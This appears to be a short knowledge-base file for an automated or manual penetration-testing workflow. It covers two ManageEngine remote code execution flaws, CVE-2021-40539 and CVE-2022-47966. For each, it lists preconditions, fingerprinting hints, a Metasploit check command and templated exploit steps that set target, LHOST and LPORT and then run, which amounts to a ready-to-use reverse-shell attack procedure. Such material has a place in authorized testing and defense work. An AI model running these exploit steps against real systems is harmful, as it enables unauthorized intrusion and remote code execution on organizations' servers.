techniques.title: ManageEngine ADSelfService Plus auth bypass → RCE (CVE-2021-40539)
preconditions: REST API endpoints reachable (often behind a reverse proxy / tunnel)
techniques.notes: Unauthenticated REST-API auth bypass chained to remote code execution. Fingerprint hints: /fluidicv2/ frontend, SendPassword.do, j_security_check. Confirm the exact build before claiming applicability.
validate_steps: Fingerprint the product + build (login page footer, /fluidicv2/ assets, SendPassword.do).
Use the Metasploit check: use exploit/windows/http/manageengine_adselfservice_plus_cve_2021_40539; set RHOSTS <t>; check
exploit_steps: set RHOSTS {target}; set RPORT {port}; set LHOST {lhost}; set LPORT {lport}; run

techniques.title: ManageEngine SAML unauthenticated RCE (CVE-2022-47966)
preconditions: SAML SSO was ever configured on an affected ManageEngine product/build
techniques.notes: Unauthenticated RCE via a crafted SAML response when SAML SSO is/was enabled. Applicability depends on the exact product and build — verify before asserting.
validate_steps: Confirm product + build and whether a samlLogin/<guid> endpoint exists.
Metasploit check: use exploit/multi/http/manageengine_saml_rce_cve_2022_47966; set RHOSTS <t>; check
exploit_steps: set RHOSTS {target}; set RPORT {port}; set LHOST {lhost}; set LPORT {lport}; run
